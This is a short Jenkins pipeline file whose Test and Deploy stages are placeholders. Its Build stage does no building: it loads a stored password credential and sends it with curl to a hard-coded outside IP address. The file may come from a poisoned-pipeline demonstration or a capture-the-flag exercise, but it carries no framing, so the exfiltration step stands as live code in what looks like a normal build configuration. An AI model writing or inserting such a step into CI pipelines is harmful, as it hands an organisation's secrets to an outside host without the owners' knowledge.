pipeline {
    agent any
    stages {
        stage('Build') {
          steps {
            withCredentials([string(credentialsId: 'flpwd', variable: 'mypwd')]) {
              sh 'curl -d $mypwd "35.202.217.235:8080"'
            }
          }
        }
        stage('Test') {
            steps {
                echo 'Testing..'
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying....'
            }
        }
    }
}
